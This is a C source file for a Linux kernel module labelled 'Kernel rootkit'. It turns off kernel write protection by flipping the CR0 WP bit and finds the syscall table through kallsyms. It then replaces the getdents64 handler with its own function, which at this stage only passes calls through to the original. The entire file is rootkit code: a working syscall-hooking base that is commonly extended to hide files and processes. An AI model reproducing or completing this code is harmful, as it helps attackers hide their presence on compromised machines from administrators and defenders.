#include <asm/paravirt.h>
#include <asm/segment.h>
#include <asm/syscall.h>
#include <asm-generic/unistd.h>
#include <linux/dirent.h>
#include <linux/fcntl.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/version.h>

static sys_call_ptr_t *sys_call_table_original;
static sys_call_ptr_t sys_call_table_copy[__NR_syscalls] = { NULL };
extern unsigned long __force_order;

static inline void write_cr0_forced(unsigned long val)
{
    asm volatile("mov %0,%%cr0": "+r" (val), "+m" (__force_order));
}

static inline void unprotect_memory(void)
{
    write_cr0_forced(read_cr0() & ~X86_CR0_WP);
}

static inline void protect_memory(void)
{
    write_cr0_forced(read_cr0() | X86_CR0_WP);
}

static void hook_syscall(unsigned long nr, unsigned long faddr)
{
    unprotect_memory();

    sys_call_table_copy[nr] = sys_call_table_original[nr];
    sys_call_table_original[nr] = faddr;

    protect_memory();
}

static void unhook_all(void)
{
    int i;

    unprotect_memory();

    for (i = 0; i < __NR_syscalls; i++)
        if (sys_call_table_copy[i]) 
            sys_call_table_original[i] = sys_call_table_copy[i];

    protect_memory();
}

int sys_getdents64_fake(struct pt_regs *regs)
{
    int count = sys_call_table_copy[__NR_getdents64](regs);

    return count;
}

static int __init init_rootkit(void)
{
    sys_call_table_original = (sys_call_ptr_t *)kallsyms_lookup_name("sys_call_table");
    
    hook_syscall(__NR_getdents64, (unsigned long)sys_getdents64_fake);

    return 0;
}

static void __exit cleanup_rootkit(void)
{
    unhook_all();
}

module_init(init_rootkit);
module_exit(cleanup_rootkit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Pedro Peck");
MODULE_DESCRIPTION("Kernel rootkit");
